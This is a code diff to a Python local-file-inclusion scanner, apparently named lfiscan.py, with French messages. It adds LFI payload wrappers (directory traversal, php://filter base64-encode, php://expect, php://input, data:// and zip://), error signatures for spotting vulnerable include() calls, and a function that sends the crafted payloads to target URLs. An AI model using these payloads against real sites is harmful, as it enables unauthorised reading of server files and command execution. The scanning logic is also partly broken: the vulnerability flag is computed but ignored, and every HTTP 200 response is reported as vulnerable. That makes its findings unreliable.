@@ -7,7 +7,7 @@ import threading
 from Crawler import Crawler
 
 payloads = {
-    "../": "../"
+    "../": "../",
     "php://": {
         "filter": {
             "b64encode": "php://filter/convert.base64-encode/resource=",
@@ -17,10 +17,16 @@ payloads = {
         },
         "expect"       : "php://expect/",
         "input"        : "php://input"
-    }
+    },
     "data://"          : "data://text/plain;base64,",
     "zip://"           : "zip://"
 }
+
+errors = [
+    "Warning: file_exists()",
+    "Warning: include()",
+    "failed to open stream"    
+]
 
 tests = ["../", "php://", "data://", "zip://"]
 
@@ -43,7 +49,7 @@ def strip(url):
     if injectable(url):
         regex = re.compile('\?[a-zA-Z0-9]{1,}=')
         idx = re.findall(regex, url)
-        return ''.join([url.split(idx[0])[0], idx[0]]))
+        return ''.join([url.split(idx[0])[0], idx[0]])
     else:
         print("Erreur, l'url rentrée n'est pas au bon format.")
         return ""
@@ -74,8 +80,27 @@ def craftPayload(url, itype, arguments=False):
 
 #lfiscan.py --inject --resource=index.php 
 def inject(payload):
-    if re.match('zip://')
+    if re.search('zip://', payload) or re.search('php://input', payload):
+        pass
+    else:
+        r = requests.get(payload)
+        if r.status_code == 200:
+            vuln = False
+            for error in errors:
+                if error in r.text:
+                    vuln = True
+            print("Website might be vulnerable.")
+            print("Try injecting with --inject [url]")
+            return True
+        elif r.status_code == 403:
+            print("Website might be vulnerable: returned", r.status_code)
+            return True
+        elif r.status_code == 301 or r.status_code == 302:
+            print("Website might be vulnerable: returned", r.status_code)
+            return False
+            
         
 
 if __name__ == '__main__':
-    pass
+    if sys.argv[1] == "test":
+        test(sys.argv[2])
